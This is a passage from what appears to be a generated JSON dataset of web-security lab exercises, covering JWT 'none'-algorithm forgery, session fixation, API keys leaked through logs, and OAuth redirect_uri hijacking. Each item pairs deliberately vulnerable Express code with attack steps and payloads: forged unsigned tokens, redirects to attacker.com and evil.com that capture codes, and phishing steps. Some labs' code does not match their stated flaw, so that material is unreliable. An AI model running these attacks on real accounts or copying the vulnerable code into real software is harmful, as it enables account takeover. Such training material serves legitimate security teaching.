        "Lab Description": "The application uses JWTs to control access to user accounts. It does not validate the algorithm field when decoding JWTs. Exploiting this, attackers can replace the token algorithm with 'none' and forge admin tokens. To solve: Modify the token to impersonate Carlos and access /my-account.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
          "Capture Authorization: Bearer <token> using OWASP ZAP or Burp Suite.",
          "Decode JWT using jwt.io and inspect the 'alg' header value.",
          "Replace 'alg' with 'none' and set 'sub': 'carlos'.",
          "Remove the signature and re-encode the JWT.",
          "Send modified JWT in Authorization header to /my-account."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); app.use(require('body-parser').json()); const secret = 'supersecret'; app.get('/my-account', (req, res) => { const auth = req.headers['authorization']; if (!auth) return res.status(403).send('Forbidden'); const token = auth.split(' ')[1]; try { const decoded = jwt.decode(token, { complete: true }); const payload = jwt.verify(token, secret, { algorithms: [decoded.header.alg] }); res.send('Welcome ' + payload.sub); } catch (e) { res.status(401).send('Invalid token'); } }); app.listen(4000);",
        "payloads": [
          "Header: {\"alg\":\"none\"}",
          "Payload: {\"sub\":\"carlos\"}",
          "JWT without signature: base64url(header) + '.' + base64url(payload)"
        ]
      },
      {
        "Lab scenario": "Verbose logging leaks API key allowing unauthorized REST API access",
        "Lab Description": "The REST API backend logs full request headers including Authorization. The verbose debug output is exposed publicly via /logs endpoint. The attacker can extract Carlos’s API key from logs and reuse it for privilege escalation. To solve: Extract and reuse Carlos’s key to access restricted resource.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
          "Browse /logs endpoint and look for recent API request logs.",
          "Identify a log entry containing Authorization header with Bearer token for Carlos.",
          "Copy the leaked token and set it in your API client (Postman).",
          "Send GET /api/private-data with Authorization: Bearer <leaked_token>.",
          "Access Carlos’s restricted data and solve the lab."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const app = express(); const logs = []; app.use((req, res, next) => { logs.push({ path: req.path, headers: req.headers }); next(); }); app.get('/api/private-data', (req, res) => { const token = req.headers['authorization']; if (token === 'Bearer carlos-token-123') res.send('Sensitive data for Carlos'); else res.status(403).send('Unauthorized'); }); app.get('/logs', (req, res) => { res.json(logs); }); app.listen(4000);",
        "payloads": [
          "GET /logs -> extract Bearer carlos-token-123",
          "GET /api/private-data with header Authorization: Bearer carlos-token-123"
        ]
      },
      {
        "Lab scenario": "REST-based Session Fixation in Login Flow",
        "Lab Description": "This lab's REST API implements insecure session handling that enables session fixation. The application generates a session ID before login, which is then reused post-authentication. To solve: Hijack a valid user session after fixing the session identifier in the victim's browser.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
          "Use Burp Suite to intercept a GET /session request to capture a pre-authentication session ID.",
          "Send a crafted login link to the victim with the fixed session ID as a cookie via social engineering.",
          "Wait for the victim to authenticate using the fixed session.",
          "Send a request to /my-account using the fixed session cookie to validate session takeover.",
          "Access Carlos's account details to confirm successful exploitation."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const bodyParser = require('body-parser'); const app = express(); app.use(cookieParser()); app.use(bodyParser.json()); const sessions = {}; const users = [{ username: 'carlos', password: 'pass123' }]; app.get('/session', (req, res) => { const sid = Math.random().toString(36).substring(2); sessions[sid] = { authenticated: false }; res.cookie('session_id', sid); res.send({ message: 'Session initialized' }); }); app.post('/login', (req, res) => { const sid = req.cookies.session_id; const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (sid && user) { sessions[sid] = { authenticated: true, user: username }; res.send('Login successful'); } else { res.status(401).send('Login failed'); } }); app.get('/my-account', (req, res) => { const session = sessions[req.cookies.session_id]; if (session && session.authenticated) { res.send('Welcome, ' + session.user); } else { res.status(403).send('Not authorized'); } }); app.listen(4000);",
        "payloads": [
          "Cookie: session_id=FIXED123 before login; use same after login",
          "Social engineering link with fixed session cookie",
          "POST /login with fixed session in header"
        ]
      },
      {
        "Lab scenario": "JWT Authentication Bypass via None Algorithm",
        "Lab Description": "This lab uses JWTs for API authentication but improperly supports the `none` algorithm. This allows an attacker to forge a valid token without signing it. To solve: Generate a forged JWT for the admin user and access the admin panel.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "Use Burp Suite or Postman to intercept an authenticated request and capture a valid JWT.",
          "Decode the JWT using jwt.io and observe the HS256 algorithm in the header.",
          "Modify the header to use \"alg\":\"none\" and payload to {\"username\":\"admin\"}.",
          "Remove the JWT signature and re-encode the token.",
          "Send the forged token in the Authorization header and access /admin-panel to solve the lab."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.json()); const secret = 'supersecretkey'; app.post('/login', (req, res) => { const { username } = req.body; const token = jwt.sign({ username }, secret, { algorithm: 'HS256' }); res.send({ token }); }); app.get('/admin-panel', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; if (!token) return res.status(401).send('Token missing'); try { const decoded = jwt.verify(token, secret); if (decoded.username === 'admin') { res.send('Welcome admin'); } else { res.status(403).send('Forbidden'); } } catch { res.status(400).send('Invalid token'); } }); app.listen(4000);",
        "payloads": [
          "{\"alg\":\"none\",\"typ\":\"JWT\"}",
          "{\"username\":\"admin\"}",
          "Base64Url(header).Base64Url(payload)."
        ]
      },
      {
        "Lab scenario": "OAuth Redirection Misconfiguration in Authorization Server",
        "Lab Description": "This lab demonstrates an insecure OAuth implementation where the redirect URI is not properly validated. The attacker can intercept the authorization code and exchange it for a token. To solve: Hijack Carlos’s OAuth token by injecting a malicious redirect URI.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "Use Burp to intercept the login flow and observe the /authorize redirect request.",
          "Modify the redirect_uri parameter to a domain you control (e.g., attacker.com).",
          "Host a server to capture the authorization code sent to the malicious redirect URI.",
          "Exchange the stolen code with the /token endpoint using Postman to receive an access token.",
          "Use the token in Authorization header to access /my-account and solve the lab."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const querystring = require('querystring'); const app = express(); const users = [{ username: 'carlos', password: 'oauthpass' }]; app.get('/authorize', (req, res) => { const { redirect_uri, state } = req.query; const code = 'abc123'; res.redirect(redirect_uri + '?code=' + code + '&state=' + state); }); app.post('/token', (req, res) => { const { code } = req.body; if (code === 'abc123') res.send({ access_token: 'admin-token' }); else res.status(400).send('Invalid code'); }); app.get('/my-account', (req, res) => { const auth = req.headers.authorization; if (auth === 'Bearer admin-token') { res.send('Welcome Carlos'); } else { res.status(403).send('Unauthorized'); } }); app.listen(4000);",
        "payloads": [
          "https://attacker.com/callback as redirect_uri",
          "POST /token with stolen code",
          "Authorization: Bearer admin-token"
        ]
      },
      {
        "Lab scenario": "JWT Algorithm Confusion in Token Verification",
        "Lab Description": "The application uses JSON Web Tokens (JWTs) for session management but improperly handles the 'alg' field in the token header. Instead of verifying the signature with a secret key, it trusts tokens with 'none' as the algorithm and accepts them without verification. The application grants access if a valid token for 'carlos' is submitted. To solve: Forge a token with alg set to 'none' and impersonate Carlos.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
          "1. Intercept a request to /my-account using Burp Suite and extract the JWT from the Authorization header.",
          "2. Decode the JWT using jwt.io or Burp Decoder and note the payload structure.",
          "3. Modify the payload to {\"username\": \"carlos\"} and change the header to {\"alg\": \"none\"}.",
          "4. Remove the signature part entirely and re-encode the token as base64(header).base64(payload).",
          "5. Replay the request with the forged token using Burp Repeater and verify access to Carlos's account."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const jwt = require('jsonwebtoken'); const express = require('express'); const app = express(); app.use(require('body-parser').json()); const secret = 'supersecret'; app.get('/my-account', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; const decoded = jwt.decode(token, { complete: true }); if (decoded.header.alg === 'none') { const user = JSON.parse(Buffer.from(decoded.payload, 'base64').toString()).username; return res.send('Access granted to ' + user); } try { const verified = jwt.verify(token, secret); res.send('Access granted to ' + verified.username); } catch { res.status(401).send('Invalid token'); } }); app.listen(4000);",
        "payloads": [
          "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyJ9.",
          "Authorization: Bearer eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyJ9."
        ]
      },
      {
        "Lab scenario": "Session Fixation in Login Endpoint",
        "Lab Description": "This application generates a session cookie before login and doesn't renew it post-authentication. This allows an attacker to pre-set a valid session cookie and trick a victim into authenticating using that session. The attacker can then hijack the session to gain access. To solve: Fixate Carlos's session ID, make him log in, then use the same session to access his account.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "1. Generate a session cookie by accessing the login page and intercepting the response with OWASP ZAP.",
          "2. Craft a phishing link with the pre-set session ID (e.g., /login?sessionid=abc123).",
          "3. Simulate Carlos logging in using the fixed session via Burp Repeater (change session ID in cookie manually).",
          "4. Replay the fixed session cookie to /my-account endpoint.",
          "5. Confirm hijacked session access to Carlos’s account by observing personalized data."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const bodyParser = require('body-parser'); const app = express(); app.use(cookieParser()); app.use(bodyParser.urlencoded({ extended: true })); const sessions = {}; const users = { 'carlos': 'qwerty123' }; app.get('/login', (req, res) => { const sessionId = req.cookies.sid || Math.random().toString(36).substring(2); sessions[sessionId] = null; res.cookie('sid', sessionId); res.send('<form method=\"POST\"><input name=\"username\"><input name=\"password\"><button>Login</button></form>'); }); app.post('/login', (req, res) => { const { username, password } = req.body; const sid = req.cookies.sid; if (users[username] === password) { sessions[sid] = username; res.redirect('/my-account'); } else { res.send('Login failed'); } }); app.get('/my-account', (req, res) => { const user = sessions[req.cookies.sid]; if (user) return res.send('Welcome back ' + user); res.status(403).send('Not authenticated'); }); app.listen(4000);",
        "payloads": [
          "sid=abc123 (preset in phishing link)",
          "POST /login with valid credentials while using attacker-supplied sid",
          "GET /my-account with sid=abc123"
        ]
      },
      {
        "Lab scenario": "OAuth Misconfiguration in Redirect URI Validation",
        "Lab Description": "The application uses OAuth 2.0 for authentication, but its redirect_uri parameter validation is flawed. It accepts subdomain-based open redirect patterns, allowing attackers to steal authorization codes. To solve: Construct a malicious redirect_uri that leads to a domain you control, extract Carlos's authorization code, and complete the OAuth login flow.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "1. Initiate the OAuth login flow with Burp Suite and intercept the authorization request.",
          "2. Modify the redirect_uri to a domain under your control, such as https://attacker.carlos.lab/oauth-capture.",
          "3. Trick Carlos into clicking the malicious OAuth link (simulate in Repeater).",
          "4. Capture the authorization code redirected to your controlled domain from the browser network tab or Burp.",
          "5. Exchange the stolen code with the real client_id and redirect_uri to obtain an access token and log in as Carlos."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const app = express(); app.use(require('body-parser').urlencoded({ extended: true })); const authorizedRedirects = ['https://*.trusted.com/callback']; app.get('/auth', (req, res) => { const { redirect_uri, client_id } = req.query;  if (authorizedRedirects.some(uri => redirect_uri.includes(uri.replace('*.', '')))) { const code = 'authcode123'; res.redirect(`${redirect_uri}?code=${code}`); } else { res.status(400).send('Invalid redirect_uri'); } }); app.post('/token', (req, res) => { const { code, client_id, redirect_uri } = req.body; if (code === 'authcode123') { res.json({ access_token: 'carlos_token_abc' }); } else { res.status(403).send('Invalid code'); } }); app.listen(4000);",
        "payloads": [
          "https://attacker.carlos.lab/oauth-capture?code=authcode123",
          "POST /token with { code: authcode123, redirect_uri: https://attacker.carlos.lab/oauth-capture, client_id: legit-app }"
        ]
      },
      {
        "Lab scenario": "JWT signature bypass via algorithm confusion in login API",
        "Lab Description": "The application uses JSON Web Tokens (JWT) for session management but fails to enforce secure verification of token signatures. The login endpoint signs JWTs with HMAC using a shared secret, but the backend accepts 'none' as the algorithm, bypassing signature validation entirely. To solve: Forge a valid JWT that grants access to Carlos’s account without needing valid credentials.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
          "Use Burp Suite to intercept a login request and extract a valid JWT issued after logging into your own account.",
          "Decode the JWT using jwt.io or Burp Decoder to inspect the header and payload structure.",
          "Modify the token’s header to change the algorithm from 'HS256' to 'none' and change the payload’s sub claim to 'carlos'.",
          "Remove the signature part entirely, leaving just the header and payload base64url encoded and joined by a dot.",
          "Replay the modified JWT in the Authorization header of a /my-account request using Postman or Burp Repeater to gain access."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.json()); const SECRET = 'supersecretkey'; app.post('/login', (req, res) => { const { username, password } = req.body; if (username === 'carlos' && password === 'supersecure') { const token = jwt.sign({ sub: 'carlos' }, SECRET, { algorithm: 'HS256' }); res.json({ token }); } else { res.status(403).json({ error: 'Unauthorized' }); } }); app.get('/my-account', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; try { const payload = jwt.verify(token, SECRET, { algorithms: ['HS256', 'none'] }); if (payload.sub === 'carlos') return res.send('Welcome to Carlos's account!'); } catch (e) { return res.status(403).send('Invalid token'); } }); app.listen(4000, () => console.log('JWT Bypass Lab running'));",
        "payloads": [
          "eyJhbGciOiJub25lIn0.eyJzdWIiOiJjYXJsb3MifQ.",
          "{ \"alg\": \"none\" }.{ \"sub\": \"carlos\" }",
          "Authorization: Bearer eyJhbGciOiJub25lIn0.eyJzdWIiOiJjYXJsb3MifQ."
        ]
      },
      {
        "Lab scenario": "Session fixation via predictable session ID",
        "Lab Description": "The application issues session cookies using a sequential session ID pattern during unauthenticated visits. Upon login, the session ID is not regenerated. An attacker can set a victim’s session ID ahead of login and hijack the authenticated session. To solve: Fix Carlos’s session ID before he logs in, then hijack his session after he authenticates.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "Use Burp Suite to browse the site anonymously and inspect the Set-Cookie header to observe sequential session ID patterns (e.g., session=abc100, abc101, etc.).",
          "Manually guess or brute-force a valid session ID and use an open redirect to get Carlos to visit the crafted URL with your session ID (simulate redirect injection).",
          "Wait for Carlos to log in, reusing the session ID you fixed via open redirect.",
          "Use Burp Repeater to access /my-account with the fixed session ID in the Cookie header.",
          "Confirm access to Carlos’s account, proving the session was successfully hijacked."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); let sessionCounter = 100; const sessions = {}; app.get('/', (req, res) => { const sid = 'abc' + sessionCounter++; res.cookie('session', sid); sessions[sid] = { authenticated: false, user: null }; res.send('Session initialized'); }); app.post('/login', (req, res) => { const { username, password } = req.body; const sid = req.cookies.session; if (username === 'carlos' && password === 'hunter2') { sessions[sid] = { authenticated: true, user: 'carlos' }; res.send('Login successful'); } else { res.status(401).send('Login failed'); } }); app.get('/my-account', (req, res) => { const sid = req.cookies.session; if (sessions[sid]?.authenticated && sessions[sid].user === 'carlos') { res.send('Carlos's account'); } else { res.status(403).send('Access denied'); } }); app.listen(4000, () => console.log('Session Fixation Lab running'));",
        "payloads": [
          "Cookie: session=abc104",
          "http://victim.site/redirect?url=http://lab.site/?session=abc104",
          "Burp Intruder attack against incrementing session IDs: abc100 to abc110"
        ]
      },
      {
        "Lab scenario": "OAuth misconfiguration leading to open redirect trust abuse",
        "Lab Description": "The application uses a third-party OAuth provider to handle login via redirects. The redirect_uri is not validated securely, allowing attackers to inject arbitrary URLs and harvest authorization codes. To solve: Trick the OAuth flow to leak Carlos’s token and use it to access his account.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "Use OWASP ZAP or Burp Suite to initiate the login flow and observe the OAuth authorization request structure, including client_id and redirect_uri parameters.",
          "Modify the redirect_uri to point to your own server or a URL under your control that simulates a trusted subdomain (e.g., attacker.lab.com).",
          "Send the malicious link to the victim (Carlos) via social engineering. When Carlos clicks it and authorizes access, the authorization code will be redirected to your server.",
          "Exchange the stolen authorization code for an access token using the OAuth token endpoint.",
          "Replay the token using Postman to call /my-account with Authorization: Bearer <token> and access Carlos’s account."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const axios = require('axios'); const app = express(); const oauthProvider = 'https://auth.example.com'; const clientID = 'app-client-123'; const clientSecret = 'secret'; const redirectURIs = ['https://app.com/callback']; app.get('/login', (req, res) => { const redirect = req.query.redirect_uri; if (!redirect.startsWith('https://app.com')) return res.status(400).send('Invalid redirect'); const url = `${oauthProvider}/authorize?client_id=${clientID}&redirect_uri=${redirect}&response_type=code`; res.redirect(url); }); app.get('/callback', async (req, res) => { const { code } = req.query; const tokenResp = await axios.post(`${oauthProvider}/token`, { code, client_id: clientID, client_secret: clientSecret }); const accessToken = tokenResp.data.access_token; if (accessToken === 'token-carlos') res.send('Carlos's account'); else res.send('Access denied'); }); app.listen(4000, () => console.log('OAuth Redirect Lab running'));",
        "payloads": [
          "https://auth.example.com/authorize?client_id=app-client-123&redirect_uri=https://attacker.com/callback&response_type=code",
          "Stolen code exchanged via curl: curl -X POST -d 'code=leakedcode&client_id=app-client-123&client_secret=secret' https://auth.example.com/token",
          "Authorization: Bearer token-carlos"
        ]
      },   
      {
        "Lab scenario": "JWT tampering via algorithm confusion",
        "Lab Description": "This lab's login system uses JWTs for session management and accepts unsigned tokens due to a flawed algorithm check. The application fails to validate the algorithm used in the JWT header. To solve: Forge a JWT token that grants access to Carlos's account using algorithm confusion.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
          "Use Burp Suite or Postman to capture a valid JWT issued after login.",
          "Inspect the JWT in jwt.io or a local script to analyze its header and payload.",
          "Change the algorithm in the JWT header from HS256 to 'none' and remove the signature section.",
          "Replace the payload username with 'carlos' to impersonate the victim.",
          "Send the forged token in the Authorization header to access /my-account and confirm access."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.json()); const secret = 'supersecret'; app.post('/login', (req, res) => { const { username, password } = req.body; if (username === 'carlos' && password === 'supersecure') { const token = jwt.sign({ username }, secret, { algorithm: 'HS256' }); res.json({ token }); } else { res.status(401).send('Invalid credentials'); } }); app.get('/my-account', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; try { const payload = jwt.verify(token, secret); res.send(`Welcome ${payload.username}`); } catch (e) { res.status(403).send('Access denied'); } }); app.listen(4000, () => console.log('JWT lab running on http://localhost:4000'));",
        "payloads": [
          "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyJ9.",
          "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImFkbWluIn0."
        ]
      },
      {
        "Lab scenario": "Session fixation via insecure session handling",
        "Lab Description": "This lab's session management system is vulnerable to session fixation. It reuses session IDs across login flows and does not regenerate tokens upon authentication. The application accepts pre-assigned session cookies before login. To solve: Fixate a session and force Carlos to use it, then access /my-account with the same session.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "Use OWASP ZAP to capture the initial session cookie assigned before login.",
          "Send Carlos a phishing link that pre-sets the session ID via a crafted request.",
          "Use the same session ID on your side and wait for Carlos to log in.",
          "Replay the session using the fixed cookie after Carlos logs in.",
          "Access /my-account to confirm the session hijack."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const session = require('express-session'); const bodyParser = require('body-parser'); const app = express(); app.use(session({ secret: 'fixationkey', resave: false, saveUninitialized: true })); app.use(bodyParser.urlencoded({ extended: true })); const users = [{ username: 'carlos', password: 'hunter2' }]; app.get('/login', (req, res) => { res.send('<form method=\"POST\"><input name=\"username\"/><input name=\"password\"/><button>Login</button></form>'); }); app.post('/login', (req, res) => { const user = users.find(u => u.username === req.body.username && u.password === req.body.password); if (user) { req.session.user = user.username; res.redirect('/my-account'); } else { res.send('Invalid credentials'); } }); app.get('/my-account', (req, res) => { if (req.session.user) { res.send(`Welcome ${req.session.user}`); } else { res.send('Please log in'); } }); app.listen(4001, () => console.log('Session Fixation Lab running on http://localhost:4001'));",
        "payloads": [
          "Set-Cookie: connect.sid=sessid123;",
          "GET /login?session=connect.sid=sessid123",
          "Cookie: connect.sid=sessid123"
        ]
      },
      {
        "Lab scenario": "OAuth redirect manipulation leading to account takeover",
        "Lab Description": "This lab's OAuth flow contains an open redirect flaw on the redirect_uri parameter. The application trusts user-supplied redirect URIs without proper validation, enabling account takeover via third-party OAuth provider token reuse. To solve: Manipulate the redirect URI to capture Carlos’s OAuth token and use it to access /my-account.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "Use Burp Suite to intercept the OAuth login request and analyze the redirect_uri parameter.",
          "Modify the redirect_uri to a malicious endpoint you control and host it via an HTTP server.",
          "Send the crafted login link to Carlos and wait for the redirect with the authorization code/token.",
          "Exchange the captured code for an access token via a crafted POST request to the OAuth provider.",
          "Replay the token with the session API to log in as Carlos and access /my-account."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const app = express(); const axios = require('axios'); app.get('/login', (req, res) => { const redirect = req.query.redirect_uri; const oauthUrl = `https://oauth.example.com/auth?client_id=abc123&redirect_uri=${redirect}&response_type=code`; res.redirect(oauthUrl); }); app.get('/callback', async (req, res) => { const code = req.query.code; const tokenResponse = await axios.post('https://oauth.example.com/token', { code, client_id: 'abc123', client_secret: 'xyz789' }); const user = await axios.get('https://oauth.example.com/userinfo', { headers: { Authorization: `Bearer ${tokenResponse.data.access_token}` } }); res.send(`Welcome ${user.data.username}`); }); app.listen(4002, () => console.log('OAuth Redirect Lab running on http://localhost:4002'));",
        "payloads": [
          "https://vulnerable.app/login?redirect_uri=https://evil.com/callback",
          "https://evil.com/callback?code=oauthleak123",
          "POST https://oauth.example.com/token with code=oauthleak123"
        ]
      },
      {
        "Lab scenario": "Session fixation leads to MFA bypass",
        "Lab Description": "The application incorrectly allows session identifiers to persist across authentication states, including 2FA. Once a valid user completes login, the session ID issued before 2FA is reused without validation. The application trusts the existing session cookie to grant full access after 2FA step, without re-verifying ownership. To solve: Use session fixation to access Carlos's account without completing MFA.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "1. Use Burp Suite to intercept GET /login and extract the session cookie issued before login.",
          "2. Log in to your own account and complete the 2FA flow while observing that session ID remains the same.",
          "3. Log out and prepare a script using Postman or Repeater to login as Carlos with known credentials (skipping 2FA).",
          "4. Fix the session ID to the one obtained before login and inject it before login process completes.",
          "5. Use the fixed session to directly access /my-account as Carlos."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const session = require('express-session'); const app = express(); app.use(session({ secret: 'vuln-secret', resave: false, saveUninitialized: true })); const users = [{ username: 'carlos', password: 'carlospass', is2FAEnabled: true }]; app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (user) { req.session.username = username; if (user.is2FAEnabled) return res.redirect('/verify'); res.send('Welcome'); } else res.status(403).send('Invalid'); }); app.get('/verify', (req, res) => { res.send('2FA code sent'); }); app.post('/verify', (req, res) => { req.session.authenticated = true; res.redirect('/my-account'); }); app.get('/my-account', (req, res) => { if (req.session.authenticated) res.send(`Account page for ${req.session.username}`); else res.status(403).send('Forbidden'); }); app.listen(4000);",
        "payloads": [
          "Reuse pre-auth session cookie after logging in as Carlos",
          "Fix session cookie from anonymous request and bypass MFA step"
        ]
      },
      {
        "Lab scenario": "JWT authentication bypass via 'none' algorithm",
        "Lab Description": "The application uses JWT tokens for session management but fails to validate the cryptographic algorithm used. If the 'alg' field in the JWT header is set to 'none', the application accepts unsigned tokens. To solve: Forge a JWT token with 'none' algorithm to impersonate Carlos and access the protected account page.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
          "1. Use Burp Suite to capture the Authorization Bearer token after logging in with your own account.",
          "2. Decode the JWT token using jwt.io or CyberChef to view the header and payload.",
          "3. Modify the header to use 'alg':'none' and change the payload sub to 'carlos'.",
          "4. Remove the signature and rebuild the JWT using base64url encoding.",
          "5. Replace the Authorization header with the forged token and access /my-account."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); const users = ['carlos']; app.use((req, res, next) => { const auth = req.headers['authorization']; if (auth) { const token = auth.split(' ')[1]; const payload = jwt.decode(token, { complete: true }); req.user = payload.payload.sub; } next(); }); app.get('/my-account', (req, res) => { if (users.includes(req.user)) res.send(`Account details for ${req.user}`); else res.status(401).send('Unauthorized'); }); app.listen(4000);",
        "payloads": [
          "eyJhbGciOiJub25lIn0.eyJzdWIiOiJjYXJsb3MifQ.",
          "Authorization: Bearer <JWT with alg=none and sub=carlos>"
        ]
      },
      {
        "Lab scenario": "OAuth misconfiguration via open redirect",
        "Lab Description": "This lab demonstrates an OAuth misconfiguration where the 'redirect_uri' parameter is not properly validated during the authorization flow. The application allows arbitrary redirect URIs, enabling token theft via open redirection. To solve: Intercept Carlos's OAuth authorization and redirect the token to your own server.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "1. With OWASP ZAP, proxy the OAuth login request and note the redirect_uri parameter.",
          "2. Confirm that arbitrary redirect URIs are accepted and reflected in the response.",
          "3. Host a malicious server (e.g., using Python SimpleHTTPServer or ngrok) to receive stolen tokens.",
          "4. Craft a malicious OAuth URL with redirect_uri pointing to your malicious server.",
          "5. Send the OAuth URL to Carlos (simulate click), intercept token at your server, and use it to access /my-account as Carlos."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const app = express(); app.get('/auth', (req, res) => { const { redirect_uri, token } = req.query; res.redirect(`${redirect_uri}?token=${token}`); }); app.get('/my-account', (req, res) => { const token = req.query.token; if (token === 'carlos-access-token') res.send('Welcome Carlos'); else res.status(401).send('Access denied'); }); app.listen(4000);",
        "payloads": [
          "https://vulnerable-app.com/auth?redirect_uri=https://attacker.com&token=carlos-access-token",
          "https://attacker.com/?token=carlos-access-token"
        ]
      },
      {
        "Lab scenario": "JWT token none algorithm bypass in API auth flow",
        "Lab Description": "This lab's REST API uses JWT tokens for authentication. The server does not validate the JWT signature when the algorithm is set to 'none'. The application processes JWTs without verifying the integrity of the claims. To solve: forge a JWT for the user 'carlos' and access the protected API endpoint /api/account.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
          "Intercept a valid JWT issued after login using Burp Suite or Postman.",
          "Decode the JWT using jwt.io and observe the 'alg' field is set to 'HS256'.",
          "Replace the 'alg' value with 'none' and set 'sub' or 'user' claim to 'carlos'.",
          "Remove the signature part of the token (third segment after the second dot).",
          "Use the modified JWT in the Authorization: Bearer header to request /api/account."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.json()); const users = [{ username: 'carlos', password: 'hunter2' }]; app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (!user) return res.status(403).send('Invalid login'); const token = jwt.sign({ user: username }, 'supersecret'); res.json({ token }); }); app.get('/api/account', (req, res) => { const authHeader = req.headers.authorization; if (!authHeader) return res.status(401).send('No token'); const token = authHeader.split(' ')[1]; try { const decoded = jwt.decode(token, { complete: true }); if (decoded.header.alg === 'none') { const user = decoded.payload.user; if (user === 'carlos') return res.send('Sensitive account info'); } else { jwt.verify(token, 'supersecret'); return res.send('Standard account info'); } } catch (e) { return res.status(400).send('Invalid token'); } }); app.listen(3000);",
        "payloads": [
          "eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiY2FybG9zIn0.",
          "Authorization: Bearer eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiY2FybG9zIn0."
        ]
      },
      {
        "Lab scenario": "Session fixation via predictable token reuse",
        "Lab Description": "The application uses session tokens in URL parameters and fails to regenerate the session upon authentication. An attacker can fix a session identifier and trick the victim into logging in with it, gaining access to their authenticated session. To solve: hijack Carlos’s session by pre-setting a known session token before login.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "Access the site and note the session token included in URLs, e.g., ?sid=abc123.",
          "Send the victim a crafted login URL containing a known session token: /login?sid=attacker123.",
          "Use Postman or OWASP ZAP to log in using this session token.",
          "After victim logs in via the malicious link, wait and reuse the same session token.",
          "Access /account?sid=attacker123 to take over the victim session."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const app = express(); const users = [{ username: 'carlos', password: 'letmein' }]; let sessions = {}; app.get('/login', (req, res) => { const sid = req.query.sid || Math.random().toString(36).substring(2); sessions[sid] = { loggedIn: false }; res.send(`<form method='POST' action='/login?sid=${sid}'><input name='username'><input name='password'><button>Login</button></form>`); }); app.post('/login', (req, res) => { const sid = req.query.sid; let body = ''; req.on('data', chunk => body += chunk); req.on('end', () => { const params = new URLSearchParams(body); const user = users.find(u => u.username === params.get('username') && u.password === params.get('password')); if (user) sessions[sid].loggedIn = true; res.redirect(`/account?sid=${sid}`); }); }); app.get('/account', (req, res) => { const sid = req.query.sid; if (sessions[sid] && sessions[sid].loggedIn) res.send('Sensitive data for logged in user'); else res.send('Not authenticated'); }); app.listen(4000);",
        "payloads": [
          "/login?sid=attacker123",
          "/account?sid=attacker123",
          "POST /login?sid=attacker123"
        ]
      },
      {
        "Lab scenario": "OAuth misconfiguration with open redirect and no state parameter",
        "Lab Description": "This lab demonstrates an OAuth implementation that fails to validate the 'state' parameter, exposing it to CSRF and token theft via open redirection. The application blindly trusts the redirect URI and leaks access tokens. To solve: craft a malicious authorization request that sends Carlos’s token to your controlled server.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "Use Burp Suite to initiate a login flow and capture the authorization URL.",
          "Observe that the 'state' parameter is either absent or not enforced by the app.",
          "Modify the redirect_uri to a malicious URL you control (e.g., https://evil.com/capture).",
